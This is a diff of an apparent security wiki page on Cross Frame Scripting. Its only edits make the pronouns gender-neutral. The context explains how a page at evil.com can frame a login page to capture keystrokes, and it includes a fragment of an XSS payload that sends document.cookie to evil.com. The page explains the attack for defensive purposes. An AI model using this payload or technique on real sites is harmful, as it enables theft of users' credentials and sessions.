@@ -40,7 +40,7 @@ which leaks keyboard events across HTML framesets (see iDefense Labs
 advisory [Microsoft Internet Explorer Cross Frame Scripting Restriction
 Bypass](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=77)).
 This bug could allow, for example, an attacker to steal the login
-credentials of a browser user as he or she tries to type them into the
+credentials of a browser user as they try to type them into the
 login form of a third-party web page.
 
 ## Examples
@@ -52,7 +52,7 @@ attacker may create a web page at evil.com, which the attacker controls,
 and include on the evil.com page a visible frame displaying the login
 page for example.com. The attacker can hide the frame's borders and
 expand the frame to cover the entire page, so that it looks to the
-browser user like he or she is actually visiting example.com The
+browser user like they are actually visiting example.com The
 attacker registers some javascript in the main evil.com page which
 listens for all key events on the page. Normally, this listener would be
 notified of events only from the main evil.com page -- but because of
@@ -112,7 +112,7 @@ request to evil.com (the iframe's src URL is wrapped for legibility):
         ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
 
 The iframe is hidden off-screen, so the browser user won't have any idea
-that he or she just "visited" the example.com page. However, this attack
+that they just "visited" the example.com page. However, this attack
 is effectively the same as a conventional XSS attack, since the attacker
 could have simply redirected the user directly to the example.com page,
 using a variety of methods, including a meta element like this (again,
@@ -127,7 +127,7 @@ the frame off-screen -- so the browser user won't have any idea that he
 or she just "visited" example.com. When using a redirect to navigate
 directly to example.com, the browser will display the example.com url in
 the browser's address bar, and the example.com page in the browser's
-window, so the browser user will be aware that he or she is visiting
+window, so the browser user will be aware that they are visiting
 example.com.
 
 ### Another XSS Attack Using Frames
